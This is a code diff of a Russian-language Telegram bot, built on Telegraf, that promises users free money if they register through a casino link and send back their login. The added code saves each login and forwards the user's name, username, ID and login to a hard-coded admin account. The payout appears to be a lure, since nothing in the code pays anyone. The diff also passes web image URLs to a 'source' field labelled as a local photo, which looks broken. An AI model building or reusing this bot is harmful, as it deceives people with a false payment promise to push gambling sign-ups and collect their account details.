@@ -4,64 +4,58 @@ require("dotenv").config();
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
+// 🔑 Впиши свой Telegram ID сюда:
+const ADMIN_ID = 123456789; // замени на свой ID
+
 // Файл для логинов
 const DATA_FILE = "logins.json";
+
+// Загружаем сохранённые логины
 let logins = {};
 if (fs.existsSync(DATA_FILE)) {
   logins = JSON.parse(fs.readFileSync(DATA_FILE));
 }
+
+// Сохраняем логины в файл
 function saveLogins() {
   fs.writeFileSync(DATA_FILE, JSON.stringify(logins, null, 2));
 }
 
-// --- Первый заход ---
+// Приветственное сообщение
 bot.start(async (ctx) => {
-  // Отправляем фотографию
   await ctx.replyWithPhoto(
-    { url: "https://i.postimg.cc/Gh8DLWZ5/assets-task-01k4pkk5xpe88vt7gj3y6fjg7y-1757400501-img-0-1.jpg" }, // замени на свою первую фотку
+    { source: "https://i.postimg.cc/Gh8DLWZ5/assets-task-01k4pkk5xpe88vt7gj3y6fjg7y-1757400501-img-0-1.jpg" }, // локальное фото
     {
       caption: "Привет! Этот бот для раздачи денег 💸.\nЧтобы продолжить, нажми кнопку ниже:",
-      ...Markup.inlineKeyboard([Markup.button.callback("➡️ Продолжить", "STEP1")]),
+      ...Markup.inlineKeyboard([
+        [Markup.button.callback("Получить деньги 💵", "get_money")],
+      ]),
     }
   );
 });
 
-// --- Первый шаг после приветствия ---
-bot.action("STEP1", async (ctx) => {
-  // Редактируем сообщение или отправляем новую фотку + текст
+// Обработка кнопки "Получить деньги"
+bot.action("get_money", async (ctx) => {
   await ctx.replyWithPhoto(
-    { url: "https://i.postimg.cc/wxbJdqbN/20250909-0107-remix-01k4nnt8knfgdap45g3kc78cxx-1.jpg" }, // замени на свою вторую фотку
+    { source: "https://i.postimg.cc/wxbJdqbN/20250909-0107-remix-01k4nnt8knfgdap45g3kc78cxx-1.jpg" }, // второе фото
     {
-      caption: `Чтобы получить 300р, тебе нужно зарегистрироваться по ссылке:\nhttps://t.me/casinobetlink/10\nи прислать свой логин. В течение 2 часов деньги придут на аккаунт по логину.`,
-      ...Markup.inlineKeyboard([Markup.button.callback("✏️ Прислать логин", "SEND_LOGIN")]),
+      caption:
+        "Чтобы получить деньги, тебе нужно зарегистрироваться по ссылке:\nhttps://t.me/casinobetlink/10\n\nи прислать свой логин. В течение 2 часов деньги придут на аккаунт по логину.",
+      ...Markup.inlineKeyboard([
+        [Markup.button.callback("📩 Прислать логин", "send_login")],
+      ]),
     }
   );
-
-  // Удаляем старое сообщение с кнопкой, чтобы не было кучи сообщений
-  try { await ctx.deleteMessage(); } catch(e) {}
 });
 
-// --- Кнопка "Прислать логин" ---
-bot.action("SEND_LOGIN", async (ctx) => {
-  const userId = String(ctx.from.id);
-
-  if (logins[userId]) {
-    return ctx.reply("❌ Вы уже отправили логин. Второй раз нельзя.");
-  }
-
-  await ctx.reply("Напиши свой логин, который зарегистрировал:");
-
-  // Флаг ожидания логина
-  bot.context.waitingForLogin = bot.context.waitingForLogin || {};
-  bot.context.waitingForLogin[userId] = true;
+// Обработка кнопки "Прислать логин"
+bot.action("send_login", async (ctx) => {
+  await ctx.reply("Напиши сюда свой логин 👇");
 });
 
-// --- Обработка текста с логином ---
+// Обработка текстовых сообщений (логинов)
 bot.on("text", async (ctx) => {
   const userId = String(ctx.from.id);
-
-  if (!bot.context.waitingForLogin?.[userId]) return;
-
   const message = ctx.message.text.trim();
 
   if (logins[userId]) {
@@ -76,10 +70,16 @@ bot.on("text", async (ctx) => {
   };
   saveLogins();
 
-  bot.context.waitingForLogin[userId] = false;
+  // ✅ Отправка пользователю
+  await ctx.reply(`✅ Логин "${message}" сохранён!`);
 
-  await ctx.reply(`✅ Логин "${message}" сохранён! Деньги поступят в течение 2 часов.`);
+  // 📩 Отправка админу в ЛС
+  await bot.telegram.sendMessage(
+    ADMIN_ID,
+    `📥 Новый логин!\n👤 Пользователь: ${ctx.from.first_name} (@${ctx.from.username || "нет"})\n🆔 ID: ${userId}\n🔑 Логин: ${message}`
+  );
 });
 
-// --- Запуск ---
-bot.launch().then(() => console.log("🤖 Бот запущен"));
+// Запуск
+bot.launch();
+console.log("🤖 Бот запущен");
